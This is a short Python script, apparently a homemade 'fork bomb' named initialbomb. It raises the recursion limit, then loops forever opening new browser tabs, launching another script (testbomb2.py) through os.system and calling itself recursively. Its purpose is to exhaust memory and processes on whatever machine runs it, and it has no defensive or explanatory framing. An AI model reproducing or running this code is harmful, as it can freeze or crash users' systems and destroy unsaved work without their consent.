import sys
import random
import os
import webbrowser
sys.setrecursionlimit(150000000)
def initialbomb():
    x = 1
    x+= 1**7
    y = 1**x
    y+=1**2**x

    while True:
        webbrowser.open_new_tab("https://www.google.com")
        random.randint(0,1000)
        os.system('python3 testbomb2.py')
        initialbomb()
initialbomb()